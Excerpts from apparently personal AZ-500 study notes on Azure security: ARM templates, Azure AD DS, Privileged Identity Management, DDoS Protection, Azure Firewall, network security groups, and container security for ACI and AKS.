as GIT. When you change the template, its revision history also documents how the template (and your deployment) has evolved over time.</li> <li>Templates promote reuse. Your template can contain parameters that are filled in when the template runs. A parameter can define a username or password, a domain name, and so on. Template parameters enable you to create multiple versions of your infrastructure, such as staging and production, while still using the exact same template.</li> <li>Templates are linkable. You can link Resource Manager templates together to make the templates themselves modular. You can write small templates that each define a piece of a solution, and then combine them to create a complete system.</li> <li>Templates simplify orchestration. You only need to deploy the template to deploy all of your resources. Normally this would take multiple operations.</li> </ul> <p>The template uses a\u00a0declarative syntax. The declarative syntax is a way of building the structure and elements that outline what resources will look like without describing the control flow. Declarative syntax is different than imperative syntax, which uses commands for the computer to perform. Imperative scripting focuses on specifying each step in deploying the resources.</p> <p>ARM templates are idempotent, which means you can deploy the same template many times and get the same resource types in the same state.</p> <p>Resource Manager orchestrates deploying the resources so they're created in the correct order. When possible, resources will also be created in parallel, so ARM template deployments finish faster than scripted deployments.</p> <p>Resource Manager also has built-in validation. It checks the template before starting the deployment to make sure the deployment will succeed.</p> <p>You can also integrate your ARM templates into continuous integration and continuous deployment (CI/CD) tools like Azure Pipelines.</p> <p>The schema:</p> <pre><code>{\n    \"$schema\": \"http://schema.management.\u200bazure.com/schemas/2019-04-01/deploymentTemplate.json#\",\u200b\n    \"contentVersion\": \"\",\u200b\n    \"parameters\": {},\u200b\n    \"variables\": {},\u200b\n    \"functions\": [],\u200b\n    \"resources\": [],\u200b\n    \"outputs\": {}\u200b\n}\n</code></pre> Element name Required Description $schema Yes Location of the JSON schema file that describes the version of the template language.

Microsoft creates and manages the required resources. Azure AD DS \u00a0deploys, manages, patches, and secures the active directory domain service  infrastructure for you. It's a managed domain experience. Azure AD DS provides a smaller subset of features to traditional self-managed AD DS environment, which reduces some of the design and management complexity. For example, there are no AD forests, domains, sites, and replication links to design and maintain. Also it guarantees access to traditional authentication mechanisms such as Kerberos or NTLM.</li> <li>A\u00a0self-managed\u00a0domain that you create and configure using traditional resources such as virtual machines (VMs), Windows Server guest OS, and Active Directory Domain Services (AD DS). You then continue to administer these resources. You're then able to do additional tasks, such as extending the schema or create forest trust. Common deployment models in a self-managed domain are:<ul> <li>Standalone cloud-only AD DS: Azure VMs are configured as domain controllers, and a separate, cloud-only AD DS environment is created. This AD DS environment doesn't integrate with an on-premises AD DS environment. A different set of credentials is used to sign in and administer VMs in the cloud.</li> <li>Resource forest deployment\u00a0- Azure VMs are configured as domain controllers, and an AD DS domain that's part of an existing forest is created. A trust relationship is then configured to an on-premises AD DS environment. Other Azure VMs can domain-join this resource forest in the cloud. User authentication runs over a VPN / ExpressRoute connection to the on-premises AD DS environment.</li> <li>Extend on-premises domain to Azure\u00a0- An Azure virtual network connects to an on-premises network using a VPN / ExpressRoute connection. Azure VMs connect to this Azure virtual network, which lets them domain-join to the on-premises AD DS environment. An alternative is to create Azure VMs and promote them as replica domain controllers from the on-premises AD DS domain.

You sign in to the service by using the same password you use to sign in to your on-premises Active Directory instance. </p> <p>How does syncronization work? In the background, the password synchronization component takes the user\u2019s password hash from on-premises Active Directory, encrypts it, and passes it as a string to Azure. Azure decrypts the encrypted hash and stores the password hash as a user attribute in Azure AD. When the user signs in to an Azure service, the sign-in challenge dialog box generates a hash of the user\u2019s password and passes that hash back to Azure. Azure then compares the hash with the one in that user\u2019s account. If the two hashes match, then the two passwords must also match and the user receives access to the resource.

When the device user requests access to a resource, the device health state is verified as part of the authentication exchange with Azure AD.</p> <p>How does Privileged Identity Management work?</p> <p>Once you set up Privileged Identity Management, you'll see Tasks, Manage, and Activity options in the left navigation menu. As an administrator, you'll choose between options such as managing Azure AD roles, managing Azure resource roles, or PIM for Groups. When you choose what you want to manage, you see the appropriate set of options for that option.</p> <p>Azure AD roles:</p> <ul> <li>Can manage Azure AD: Privileged Role Administrator, and Global Administrator roles.</li> <li>Can read  Azure AD roles:  Global Administrators, Security Administrators, Global Readers, and Security Readers roles</li> </ul> <p>Azure AD resources: - can be managed by:  Subscription Administrator, Resource Owner, and Resource User Access Administrator roles.  - can not even be read by: Privileged Role Administrators, Security Administrators, or Security Readers roles </p> <p>Make sure there are always at least two users in a Privileged Role Administrator role, in case one user is locked out or their account is deleted.</p> <p>When creating an assignment, something that I didn't know in the setting up: - Type of the assignment     - Eligible assignments require the member of the role to perform an action to use the role. Actions might include activation or requesting approval from designated approvers.     - Active assignments don't require the member to perform any action to use the role. Members assigned as active have the privileges assigned to the role.</p> <p>How activates a role?  If users have been made eligible for a role, then they must activate the role assignment before using the role. To activate the role, users select a specific activation duration within the maximum (configured by administrators) and the reason for the activation request. If the role requires approval to activate, a notification will appear in the upper right corner of the user's browser, informing them the request is pending approval. If approval isn't required, the member can start using the role. Delegated approvers receive email notifications when a role request is pending their approval. Approvers can view, approve or deny these pending requests in PIM. After the request has been approved, the member can start using the role. For example, if a user or a group was assigned with Contribution role to a resource group, they'll be able to manage that particular resource group.</p> <p>To extend or  renew assignments, it's required approval from a Global Administrator or Privileged Role Administrator. Notifications can be sent to Admins, Requestors, and Approvers.</p> <p>Privileged Role Administrator permissions</p> <ul> <li>Enable approval for specific roles</li> <li>Specify approver users or groups to approve requests</li> <li>View request and approval history for all privileged roles</li> </ul> <p>Approver permissions</p> <ul> <li>View pending approvals (requests)</li> <li>Approve or reject requests for role elevation (single and bulk)</li> <li>Provide justification for my approval or rejection</li> </ul> <p>Eligible role user permissions</p> <ul> <li>Request activation of a role that requires approval</li> <li>View the status of your request to activate</li> <li>Complete your task in Azure AD if activation was approved</li> </ul> <p>Assignment settings: </p> <ul> <li>Allow permanent eligible assignment. Global admins and Privileged role admins can assign permanent eligible assignment. They can also require that all eligible assignments have a specified start and end date.</li> <li>Allow permanent active assignment. Global admins and Privileged role admins can assign active eligible assignment. They can also require that all active assignments have a specified start and end date.</li> </ul> <p>Implement a privileged identity management workflow</p> <p>By configuring Azure AD PIM to manage our elevated access roles in Azure AD, we now have JIT access for more than 28 configurable privileged roles. We can also monitor access, audit account elevations, and receive additional alerts through a management dashboard in the Azure portal.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-1-identity-and-access/#5-design-an-enterprise-governance-strategy-azure-resource-manager","title":"5.

This support means that previous efforts to develop and maintain a library of Resource Manager templates are reusable in Blueprints.</p> <p>Blueprint definition - A blueprint is composed of\u00a0artifacts. Azure Blueprints currently supports the following resources as artifacts:</p> Resource Hierarchy options Description Resource Groups Subscription Create a new resource group for use by other artifacts within the blueprint. These placeholder resource groups enable you to organize resources exactly how you want them structured and provide a scope limiter for included policy and role assignment artifacts and ARM templates. ARM template Subscription, Resource Group Templates, including nested and linked templates, are used to compose complex environments. Example environments: a SharePoint farm, Azure Automation State Configuration, or a Log Analytics workspace. Policy Assignment Subscription, Resource Group Allows assignment of a policy or initiative to the subscription the blueprint is assigned to. The policy or initiative must be within the scope of the blueprint definition location. If the policy or initiative has parameters, these parameters are assigned at the creation of the blueprint or during blueprint assignment. Role Assignment Subscription, Resource Group Add an existing user or group to a built-in role to make sure the right people always have the right access to your resources. Role assignments can be defined for the entire subscription or nested to a specific resource group included in the blueprint. <p>Blueprint definition locations - When creating a blueprint definition, you'll define where the blueprint is saved.

Different environments, such as development, test, and production, are often removed from a management perspective.</li> <li>Policy boundary: Subscriptions serve as a boundary for the Azure Policy assignments. For example, secure workloads like PCI typically require other policies in order to achieve compliance. The other overhead doesn't get considered if you use a separate subscription. Development environments have more relaxed policy requirements than production environments.</li> <li>Target network topology: You can't share virtual networks across subscriptions, but you can connect them with different technologies like\u00a0virtual network peering or\u00a0Azure ExpressRoute. When deciding if you need a new subscription, consider which workloads need to communicate with each other.</li> </ul> </li> <li>Group subscriptions together under management groups, which are aligned with your management group structure and policy requirements.

The Azure network infrastructure enables you to securely connect Azure resources to each other with virtual networks (VNets). A VNet is a representation of your own network in the cloud. A VNet is a logical isolation of the Azure cloud network dedicated to your subscription. You can connect VNets to your on-premises networks.</p> <p>Azure supports\u00a0dedicated WAN link connectivity\u00a0to your on-premises network and an Azure Virtual Network with ExpressRoute. The link between Azure and your site uses a dedicated connection that does not go over the public Internet.</p> <p>Virtual networks</p> <p>Virtual networks in Azure are network overlays that you can use to configure and control the connectivity among Azure resources, such as VMs and load balancers. A virtual network is scoped to a single Azure region. Virtual networks are made up of subnets. A subnet is a range of IP addresses within your virtual network. Subnets, like virtual networks, are scoped to a single Azure region.  You can implement multiple virtual networks within each Azure subscription and Azure region. Each virtual network is isolated from other virtual networks. For each virtual network you can: - Specify a custom private IP address space using public and private addresses. Azure assigns resources in a virtual network a private IP address from the address space that you assign. - Segment the virtual network into one or more subnets and allocate a portion of the virtual network's address space to each subnet. - Use Azure-provided name resolution, or specify your own DNS server, for use by resources in a virtual network.</p> <p>IP addresses</p> <p>VMs, Azure load balancers, and application gateways in a single virtual network require unique Internet Protocol (IP) addresses the same way that clients in an on-premises subnet do. This enables these resources to communicate with each other: - Private\u00a0- A private IP address is dynamically or statically allocated to a VM from the defined scope of IP addresses in the virtual network. VMs use these addresses to communicate with other VMs in the same or connected virtual networks through a gateway / Azure ExpressRoute connection. These private IP addresses, or non-routable IP addresses, conform to RFC 1918. - Public\u00a0- Public IP addresses, which allow Azure resources to communicate with external clients, are assigned directly at the virtual network adapter of the VM or to the load balancer. Public IP address can also be added to Azure-only virtual networks. All IP blocks in the virtual network will be routable only within the customer's network, and they won't be reachable from outside. Virtual network packets travel through the high-speed Azure backplane.</p> <p>You can control the dynamic IP addresses assigned to VMs and cloud services within an Azure virtual network by specifying an IP addressing scheme.</p> <p>Subnets</p> <p>Each subnet contains a range of IP addresses that fall within the virtual network address space. Subnetting hides the details of internal network organization from external routers. Subnetting also segments the host within the network, making it easier to apply network security at the interconnections between subnets.</p> <p>Network adapters</p> <p>VMs communicate with other VMs and other resources on the network by using virtual network adapters. Virtual network adapters configure VMs with private and, optionally, public IP address.

Ensure that security is a priority throughout the entire lifecycle of an application, from design and implementation to deployment and operations. Applications might have bugs that allow a relatively low volume of requests to use a lot of resources, resulting in a service outage.</p> <p>For this, take into account these pillars: - Scalability - The ability of a system to handle increased load. - Availability - The proportion of time that a system is functional and working. - Resiliency - The ability of a system to recover from failures and continue to function. - Management - Operations processes that keep a system running in production. - Security - Protecting applications and data from threats</p> <p>2. Design your applications to scale horizontally to meet the demands of an amplified load\u2014specifically, in the event of a DDoS. If your application depends on a single instance of a service, it creates a single point of failure. Provisioning multiple instances makes your system more resilient and more scalable.</p> <p>For this, these are valid ways to address it: - For Azure App Service, select an App Service plan that offers multiple instances. - For Azure Cloud Services, configure each of your roles to use multiple instances. - For Azure Virtual Machines, ensure that your VM architecture includes more than one VM and that each VM is included in an availability set.

Azure DDoS protection provides the following service tiers:</p> <ul> <li>Basic: Automatically enabled as part of the Azure platform. Always-on traffic monitoring, and real-time mitigation of common network-level attacks, provide the same defenses utilized by Microsoft's online services. The entire scale of Azure's global network can be used to distribute and mitigate attack traffic across regions. Protection is provided for IPv4 and IPv6 Azure public IP addresses.</li> <li>Standard: Provides additional mitigation capabilities over the Basic service tier that are tuned specifically to Azure Virtual Network resources. DDoS Protection Standard is simple to enable, and requires no application changes. Protection policies are tuned through dedicated traffic monitoring and machine learning algorithms. Policies are applied to public IP addresses associated to resources deployed in virtual networks, such as Azure Load Balancer, Azure Application Gateway, and Azure Service Fabric instances, but this protection does not apply to App Service Environments. Real-time telemetry is available through Azure Monitor views during an attack, and for history. Rich attack mitigation analytics are available via diagnostic settings. Application layer protection can be added through the Azure Application Gateway Web Application Firewall or by installing a 3rd party firewall from Azure Marketplace. Protection is provided for IPv4 and IPv6 Azure public IP addresses.</li> </ul> <p></p> <p>DDoS Protection Standard monitors actual traffic utilization and constantly compares it against the thresholds defined in the DDoS policy. When the traffic threshold is exceeded, DDoS mitigation is automatically initiated. When traffic returns to a level below the threshold, the mitigation is removed. During mitigation, DDoS Protection redirects traffic sent to the protected resource and performs several checks, including: - Helping ensure that packets conform to internet specifications and aren\u2019t malformed. - Interacting with the client to determine if the traffic might be a spoofed packet (for example, using\u00a0<code>SYN Auth</code>\u00a0or\u00a0<code>SYN Cookie</code>\u00a0or dropping a packet for the source to retransmit it). - Using rate-limit packets if it can\u2019t perform any other enforcement meth</p> <p>DDoS Protection blocks attack traffic and forwards the remaining traffic to its intended destination.

Azure Monitor retains metric data for DDoS Protection Standard for 30 days.</p> <p>DDoS Protection Standard can mitigate the following types of attacks:</p> <ul> <li>Volumetric attacks: The attack's goal is to flood the network layer with a substantial amount of seemingly legitimate traffic. It includes UDP floods, amplification floods, and other spoofed-packet floods. DDoS Protection Standard mitigates these potential multi-gigabyte attacks by absorbing and scrubbing them, with Azure's global network scale, automatically.</li> <li>Protocol attacks: These attacks render a target inaccessible, by exploiting a weakness in the layer 3 and layer 4 protocol stack. It includes, SYN flood attacks, reflection attacks, and other protocol attacks. DDoS Protection Standard mitigates these attacks, differentiating between malicious and legitimate traffic, by interacting with the client, and blocking malicious traffic.</li> <li>Resource (application) layer attacks: These attacks target web application packets, to disrupt the transmission of data between hosts. The attacks include HTTP protocol violations, SQL injection, cross-site scripting, and other layer 7 attacks. Use a Web Application Firewall, such as the Azure Application Gateway web application firewall, as well as DDoS Protection Standard to provide defense against these attacks.

Azure Firewall","text":"<p>Azure Firewall\u00a0is a managed, cloud-based network security service that protects your Azure Virtual Network resources. It\u2019s a fully stateful firewall-as-a-service with built-in high availability and unrestricted cloud scalability. By default, Azure Firewall blocks traffic.</p> <ul> <li>Built-in high availability\u00a0- Because high availability is built in, no additional load balancers are required and there\u2019s nothing you need to configure.</li> <li>Unrestricted cloud scalability\u00a0- Azure Firewall can scale up as much as you need, to accommodate changing network traffic flows so you don't need to budget for your peak traffic.</li> <li>Application Fully Qualified Domain Name (FQDN) filtering rules\u00a0- You can limit outbound HTTP/S traffic to a specified list of FQDNs, including wild cards. This feature does not require SSL termination.</li> <li>Network traffic filtering rules\u00a0- You can centrally create allow or deny network filtering rules by source and destination IP address, port, and protocol. Azure Firewall is fully stateful, so it can distinguish legitimate packets for different types of connections. Rules are enforced and logged across multiple subscriptions and virtual networks.</li> <li>Qualified domain tags\u00a0- Fully Qualified Domain Names (FQDN) tags make it easier for you to allow well known Azure service network traffic through your firewall. For example, say you want to allow Windows Update network traffic through your firewall. You create an application rule and include the Windows Update tag. Now network traffic from Windows Update can flow through your firewall.</li> <li>Outbound Source Network Address Translation (OSNAT) support\u00a0- All outbound virtual network traffic IP addresses are translated to the Azure Firewall public IP. You can identify and allow traffic originating from your virtual network to remote internet destinations.</li> <li>Inbound Destination Network Address Translation (DNAT) support\u00a0- Inbound network traffic to your firewall public IP address is translated and filtered to the private IP addresses on your virtual networks.</li> <li>Azure Monitor logging\u00a0- All events are integrated with Azure Monitor, allowing you to archive logs to a storage account, stream events to your Event Hub, or send them to Azure Monitor logs.</li> </ul> <p>Flow of rules for inbound traffic: Grouping the features above into logical groups reveals that Azure Firewall has three rule types:\u00a0NAT rules,\u00a0network rules, and\u00a0application rules. Network rules are applied first, then application rules. Rules are terminating, which means if a match is found in network rules, then application rules are not processed. If there\u2019s no network rule match, and if the packet protocol is HTTP/HTTPS, the packet is then evaluated by the application rules. If no match continues to be found, then the packet is evaluated against the infrastructure rule collection. If there\u2019s still no match, then the packet is denied by default.</p> <p>NAT rules -  Inbound Destination Network Address Translation (DNAT). Filter inbound traffic with Azure Firewall DNAT using the Azure portal. DNAT rules are applied first. If a match is found, an implicit corresponding network rule to allow the translated traffic is added. You can override this behavior by explicitly adding a network rule collection with deny rules that match the translated traffic. No application rules are applied for these connections.</p> <p>Network rules - Grant access from a virtual network. You can configure storage accounts to allow access only from specific VNets. You enable a service endpoint for Azure Storage within the VNet. This endpoint gives traffic an optimal route to the Azure Storage service. The identities of the virtual network and the subnet are also transmitted with each request. Administrators can then configure network rules for the storage account that allow requests to be received from specific subnets in the VNet. Each storage account supports up to 100 virtual network rules, which could be combined with IP network rules.</p> <p>Application rules - Firewall rules to secure Azure Storage   When network rules are configured, only applications requesting data from over the specified set of networks can access a storage account. An application that accesses a storage account when network rules are in effect requires proper authorization on the request. Authorization is supported with Azure AD credentials for blobs and queues, a valid account access key, or a SAS token. By default, storage accounts accept connections from clients on any network. To limit access to selected networks, you must first change the default action. Making changes to network rules can impact your applications' ability to connect to Azure Storage. Setting the default network rule to Deny blocks all access to the data unless specific network rules that grant access are also applied. Be sure to grant access to any allowed networks using network rules before you change the default rule to deny access.</p> <p>Controlling outbound and inbound network access is an important part of an overall network security plan. Network traffic is subjected to the configured firewall rules when you route your network traffic to the firewall as the default gateway.</p> <p>One way you can control outbound network access from an Azure subnet is with Azure Firewall. With Azure Firewall, you can configure:</p> <ul> <li>Application rules that define fully qualified domain names (FQDNs) that can be accessed from a subnet.</li> <li>Network rules that define source address, protocol, destination port, and destination address.</li> </ul> <p>Fully Qualified Domain Name (FQDN) tag: An FQDN tag represents a group of fully qualified domain names (FQDNs) associated with well known Microsoft services. You can use an FQDN tag in application rules to allow the required outbound network traffic through your firewall.</p> <p>Infrastructure qualified domain names: Azure Firewall includes a built-in rule collection for infrastructure FQDNs that are allowed by default. These FQDNs are specific for the platform and can't be used for other purposes. The following services are included in the built-in rule collection:</p> <ul> <li>Compute access to storage Platform Image Repository (PIR)</li> <li>Managed disks status storage access</li> <li>Azure Diagnostics and Logging (MDS)</li> </ul> <p>You can monitor Azure Firewall using firewall logs. You can also use activity logs to audit operations on Azure Firewall resources. You can access some of these logs through the portal. Logs can be sent to Azure Monitor logs, Storage, and Event Hubs and analyzed in Azure Monitor logs or by different tools such as Excel and Power BI. Metrics are lightweight and can support near real-time scenarios making them useful for alerting and fast issue detection.</p> <p>Threat intelligence-based filtering can be enabled for your firewall to alert and deny traffic from/to known malicious IP addresses and domains.  The IP addresses and domains are sourced from the Microsoft Threat Intelligence feed. Intelligent Security Graph powers Microsoft threat intelligence and is used by multiple services including Microsoft Defender for Cloud. If you've enabled threat intelligence-based filtering, the associated rules are processed before any of the NAT rules, network rules, or application rules. You can choose to just log an alert when a rule is triggered, or you can choose alert and deny mode. By default, threat intelligence-based filtering is enabled in alert mode.</p> <p>Rule processing logic: You can configure NAT rules, network rules, and applications rules on Azure Firewall. Rule collections are processed according to the rule type in priority order, lower numbers to higher numbers from 100 to 65,000. A rule collection name can have only letters, numbers, underscores, periods, or hyphens. It must begin with a letter or number, and end with a letter, number or underscore. The maximum name length is 80 characters.</p> <p>Service tags represent a group of IP address prefixes to help minimize complexity for security rule creation. Microsoft manages the address prefixes encompassed by the service tag, and automatically updates the service tag as addresses change. Azure Firewall service tags can be used in the network rules destination field. You can use them in place of specific IP addresses.</p> <p>Remote work support -  Employees aren't protected by the layered security policies associated with on-premises services while working from home. Virtual Desktop Infrastructure (VDI) deployments on Azure can help organizations rapidly respond to this changing environment. However, you need a way to protect inbound/outbound Internet access to and from these VDI deployments. You can use Azure Firewall DNAT rules along with its threat intelligence-based filtering capabilities to protect your VDI deployments. Azure Virtual Desktop is a comprehensive desktop and app virtualization service running in Azure. It\u2019s the only virtual desktop infrastructure (VDI) that delivers simplified management, multi-session Windows 10, optimizations for Microsoft 365 ProPlus, and support for Remote Desktop Services (RDS) environments. </p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#14-configure-vpn-forced-tunneling","title":"1.4.

With the classic deployment model, you can also assign NSGs to individual computers to control traffic that is both destined for and leaving the VM. With the Resource Manager deployment model, you can assign NSGs to a network adapter so that NSG rules control only the traffic that flows through that network adapter. If the VM has multiple network adapters, NSG rules won\u2019t automatically be applied to traffic that is designated for other network adapters.</p> <p>Network Security Group limitations</p> <p>When implementing NSGs, these are the limits to keep in mind:</p> <ul> <li>By default, you can create 100 NSGs per region per subscription.

So if /images are in the incoming URL, you can route traffic to a specific set of servers (known as a pool) configured for images. If /video is in the URL, that traffic is routed to another pool that's optimized for videos. This type of routing is known as application layer (OSI layer 7) load balancing.</p> <p>Application Gateway includes the following features:</p> <ul> <li>Secure Sockets Layer (SSL/TLS) termination\u00a0- Application gateway supports SSL/TLS termination at the gateway, after which traffic typically flows unencrypted to the backend servers. This feature allows web servers to be unburdened from costly encryption and decryption overhead.</li> <li>Autoscaling\u00a0- Application Gateway Standard_v2 supports autoscaling and can scale up or down based on changing traffic load patterns.

This architecture typically offers better round-trip times for end users (maximizing the benefits of Split TCP). Front Door organizes its environments into primary and fallback \"rings\". The outer ring has environments that are closer to users, offering lower latencies. The inner ring has environments that can handle the failover for the outer ring environment in case an issue happens. The outer ring is the preferred target for all traffic, but the inner ring is necessary to handle traffic overflow from the outer ring.

Containers","text":"<p>A container is an isolated, lightweight silo for running an application on the host operating system. Containers build on top of the host operating system's kernel (which can be thought of as the buried plumbing of the operating system), and contain only apps and some lightweight operating system APIs and services that run in user mode. While a container shares the host operating system's kernel, the container doesn't get unfettered access to it. Instead, the container gets an isolated\u2013and in some cases virtualized\u2013view of the system. For example, a container can access a virtualized version of the file system and registry, but any changes affect only the container and are discarded when it stops. To save data, the container can mount persistent storage such as an Azure Disk or a file share (including Azure Files).</p> <p>You need\u00a0Docker\u00a0in order to work with Windows Containers. Docker consists of the Docker Engine (dockerd.exe), and the Docker client (docker.exe).</p> <p>How it works.-  A container builds on top of the kernel, but the kernel doesn't provide all of the APIs and services an app needs to run\u2013most of these are provided by system files (libraries) that run above the kernel in user mode. Because a container is isolated from the host's user mode environment, the container needs its own copy of these user mode system files, which are packaged into something known as a base image. The base image serves as the foundational layer upon which your container is built, providing it with operating system services not provided by the kernel.</p> <p></p> <p>Because containers require far fewer resources (for example, they don't need a full OS), they're easy to deploy and they start fast. This allows you to have higher density, meaning that it allows you to run more services on the same hardware unit, thereby reducing costs. As a side effect of running on the same kernel, you get less isolation than VMs.</p> <p>Features</p> <p>Isolation. - Typically provides lightweight isolation from the host and other containers, but doesn't provide as strong a security boundary as a VM. (You can increase the security by using Hyper-V isolation mode to isolate each container in a lightweight VM).</p> <p>Operating System. - Runs the user mode portion of an operating system, and can be tailored to contain just the needed services for your app, using fewer system resources.</p> <p>Deployment. - Deploy individual containers by using Docker via command line; deploy multiple containers by using an orchestrator such as Azure Kubernetes Service.</p> <p>Persistent storage. - Use Azure Disks for local storage for a single node, or Azure Files (SMB shares) for storage shared by multiple nodes or servers.</p> <p>Fault tolerance. - If a cluster node fails, any containers running on it are rapidly recreated by the orchestrator on another cluster node.</p> <p>Networking. - Uses an isolated view of a virtual network adapter, providing a little less virtualization\u2013the host's firewall is shared with containers\u2013while using less resources.</p> <p>In Docker, each layer is the resulting set of changes that happen to the filesystem after executing a command, such as, installing a program. So, when you view the filesystem after the layer has been copied, you can view all the files, including the layer when the program was installed. You can think of an image as an auxiliary read-only hard disk ready to be installed in a \"computer\" where the operating system is already installed. Similarly, you can think of a container as the \"computer\" with the image hard disk installed. The container, just like a computer, can be powered on or off.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#42-azure-container-instances-aci-security","title":"4.2. Azure Container Instances (ACI) security","text":"<p>There are many security recommendations for Azure Container Instances, use these to optimize your security for containers.</p> <p>Use a private registry: Containers are built from images that are stored in one or more repositories. These repositories can belong to a public registry, like Docker Hub, or to a private registry. An example of a private registry is the Docker Trusted Registry, which can be installed on-premises or in a virtual private cloud. You can also use cloud-based private container registry services, including Azure Container Registry. A publicly available container image does not guarantee security. Container images consist of multiple software layers, and each software layer might have vulnerabilities. To help reduce the threat of attacks, you should store and retrieve images from a private registry, such as Azure Container Registry or Docker Trusted Registry. In addition to providing a managed private registry, Azure Container Registry supports service principal-based authentication through Microsoft Entra ID for basic authentication flows. This authentication includes role-based access for read-only (pull), write (push), and other permissions.</p> <p>Monitor and scan container images continuously: Take advantage of solutions to scan container images in a private registry and identify potential vulnerabilities. It\u2019s important to understand the depth of threat detection that the different solutions provide. For example, Azure Container Registry optionally integrates with Microsoft Defender for Cloud to automatically scan all Linux images pushed to a registry. Microsoft Defender for Cloud integrated Qualys scanner detects image vulnerabilities, classifies them, and provides remediation guidance.</p> <p>Protect credentials: Containers can spread across several clusters and Azure regions. So, you must secure credentials required for logins or API access, such as passwords or tokens. Ensure that only privileged users can access those containers in transit and at rest. Inventory all credential secrets, and then require developers to use emerging secrets-management tools that are designed for container platforms. Make sure that your solution includes encrypted databases, TLS encryption for secrets data in transit, and least-privilege role-based access control. Azure Key Vault is a cloud service that safeguards encryption keys and secrets (such as certificates, connection strings, and passwords) for containerized applications. Because this data is sensitive and business critical, secure access to your key vaults so that only authorized applications and users can access them.</p> <p>Use vulnerability management as part of your container development lifecycle: By using effective vulnerability management throughout the container development lifecycle, you improve the odds that you identify and resolve security concerns before they become a more serious problem.</p> <p>Scan for vulnerabilities: New vulnerabilities are discovered all the time, so scanning for and identifying vulnerabilities is a continuous process. Incorporate vulnerability scanning throughout the container lifecycle:</p> <p>Ensure that only approved images are used in your environment: There\u2019s enough change and volatility in a container ecosystem without allowing unknown containers as well. Allow only approved container images. Have tools and processes in place to monitor for and prevent the use of unapproved container images. An effective way of reducing the attack surface and preventing developers from making critical security mistakes is to control the flow of container images into your development environment. Image signing or fingerprinting can provide a chain of custody that enables you to verify the integrity of the containers. For example, Azure Container Registry supports Docker's content trust model, which allows image publishers to sign images that are pushed to a registry, and image consumers to pull only signed images.</p> <p>Enforce least privileges in runtime: The concept of least privileges is a basic security best practice that also applies to containers. When a vulnerability is exploited, it generally gives the attacker access and privileges equal to those of the compromised application or process. Ensuring that containers operate with the lowest privileges and access required to get the job done reduces your exposure to risk.</p> <p>Reduce the container attack surface by removing unneeded privileges: You can also minimize the potential attack surface by removing any unused or unnecessary processes or privileges from the container runtime. Privileged containers run as root. If a malicious user or workload escapes in a privileged container, the container will then run as root on that system.</p> <p>Log all container administrative user access for auditing: Maintain an accurate audit trail of administrative access to your container ecosystem, including your Kubernetes cluster, container registry, and container images. These logs might be necessary for auditing purposes and will be useful as forensic evidence after any security incident. Azure solutions include:</p> <ul> <li>Integration of Azure Kubernetes Service with Microsoft Defender for Cloud to monitor the security configuration of the cluster environment and generate security recommendations</li> <li>Azure Container Monitoring solution</li> <li>Resource logs for Azure Container Instances and Azure Container Registry</li> </ul> <p>Container access</p> <ul> <li>Azure Container Instances enables exposing your container groups directly to the internet with an IP address and a fully qualified domain name (FQDN).

Access takes places over HTTPS, using TLS to secure client connections.</li> </ul> <p>Container deployment: Deploy containers from DockerHub or Azure Container Registry.</p> <p>Hypervisor-level security:\u00a0Historically, containers have offered application dependency isolation and resource governance but have not been considered sufficiently hardened for hostile multi-tenant usage. Azure Container Instances guarantees your application is as isolated in a container as it would be in a VM.</p> <p>Custom sizes:\u00a0Containers are typically optimized to run just a single application, but the exact needs of those applications can differ greatly. Azure Container Instances provides optimum utilization by allowing exact specifications of CPU cores and memory. You pay based on what you need and get billed by the second, so you can fine-tune your spending based on actual need.</p> <p>Persistent storage: To retrieve and persist state with Azure Container Instances, we offer direct mounting of Azure Files shares backed by Azure Storage.</p> <p>Flexible billing: Supports per-GB, per-CPU, and per-second billing.</p> <p>Linux and Windows containers: \u00a0Azure Container Instances can schedule both Windows and Linux containers with the same API. Simply specify the OS type when you create your container groups. For Windows container deployments, use images based on common Windows base images. Some features are currently restricted to Linux containers:</p> <ul> <li>Multiple containers per container group</li> <li>Volume mounting (Azure Files, emptyDir, GitRepo, secret)</li> <li>Resource usage metrics with Azure Monitor</li> <li>Virtual network deployment</li> <li>GPU resources (preview)</li> </ul> <p>Co-scheduled groups: Azure Container Instances supports scheduling of multi-container groups that share a host machine, local network, storage, and lifecycle.

Azure Kubernetes Service (AKS)","text":"<p>As application development moves towards a container-based approach, the need to orchestrate and manage resources is important. Kubernetes is the leading platform that provides the ability to provide reliable scheduling of fault-tolerant application workloads. Azure Kubernetes Service (AKS) is a managed Kubernetes offering that further simplifies container-based application deployment and management.</p> <p>Azure Kubernetes Service (AKS) provides a managed Kubernetes service that reduces the complexity for deployment and core management tasks, including coordinating upgrades. The AKS control plane is managed by the Azure platform, and you only pay for the AKS nodes that run your applications. AKS is built on top of the open-source Azure Kubernetes Service Engine (aks-engine).</p> <p>Kubernetes cluster architecture: A Kubernetes cluster is divided into two components:</p> <ul> <li>Control plane\u00a0nodes provide the core Kubernetes services and orchestration of application workloads.</li> <li>Nodes\u00a0run your application workloads.</li> </ul> <p></p> <p>Features of Azure Kubernetes Service:</p> <ul> <li>Fully managed</li> <li>Public IP and FQDN (Private IP option)</li> <li>Accessed with RBAC or Microsoft Entra ID</li> <li>Deployment of containers</li> <li>Dynamic scale containers</li> <li>Automation of rolling updates and rollbacks of containers</li> <li>Management of storage, network traffic, and sensitive information</li> </ul> <p>Kubernetes cluster architecture is a set of design recommendations for deploying your containers in a secure and managed configuration. When you create an AKS cluster, a cluster master is automatically created and configured. This cluster master is provided as a managed Azure resource abstracted from the user. There is no cost for the cluster master, only the nodes that are part of the AKS cluster. The cluster master includes the following core Kubernetes components:</p> <ul> <li>kube-apiserver\u00a0- The API server is how the underlying Kubernetes APIs are exposed. This component provides the interaction for management tools, such as\u00a0<code>kubectl</code>\u00a0or the Kubernetes dashboard. By default, the Kubernetes API server uses a public IP address and a fully qualified domain name (FQDN). You can control access to the API server using Kubernetes role-based access controls and Microsoft Entra ID.</li> <li>etcd\u00a0- To maintain the state of your Kubernetes cluster and configuration, the highly available\u00a0etcd\u00a0is a key value store within Kubernetes.</li> <li>kube-scheduler\u00a0- When you create or scale applications, the Scheduler determines what nodes can run the workload and starts them.</li> <li>kube-controller-manager\u00a0- The Controller Manager oversees a number of smaller Controllers that perform actions such as replicating pods and handling node operations.</li> </ul> <p>AKS provides a single-tenant cluster master, with a dedicated API server, Scheduler, etc. You define the number and size of the 